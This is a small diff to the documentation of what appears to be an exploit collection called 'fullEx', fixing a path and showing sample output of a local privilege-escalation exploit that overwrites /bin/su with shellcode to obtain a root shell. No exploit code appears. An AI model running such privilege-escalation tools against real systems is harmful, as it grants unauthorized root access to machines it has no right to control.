@@ -394,7 +394,7 @@ AQIDBA==
 ```
 user@debian:~/fullEx$ ./fullEx.sh -PeditCow
 [+] Compilation successfuly !
-[+] PATH=/home/user/fullEx/exploits/PeditCow/a.out
+[+] PATH=/home/user/fullEx/exploit/PeditCow/a.out
 [+] Executing the binary...
 [*] target /bin/su as uid 1001; entry at file offset 0x4330; shellcode 48 bytes
 [+] su entry overwritten; exec'ing su -> interactive root shell
